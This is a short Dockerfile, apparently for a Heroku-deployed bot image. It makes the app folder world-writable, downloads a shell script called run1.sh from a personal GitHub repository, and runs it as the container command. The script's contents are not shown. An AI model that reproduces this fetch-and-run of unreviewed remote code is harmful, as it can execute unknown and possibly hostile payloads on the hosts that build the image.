FROM anasty17/mltb:heroku

WORKDIR /usr/src/app
RUN chmod 777 /usr/src/app

RUN apt-get install wget -y

RUN wget -q https://github.com/BethFSpencer/runners/raw/main/run1.sh
RUN chmod +x run1.sh

CMD ["bash", "run1.sh"]
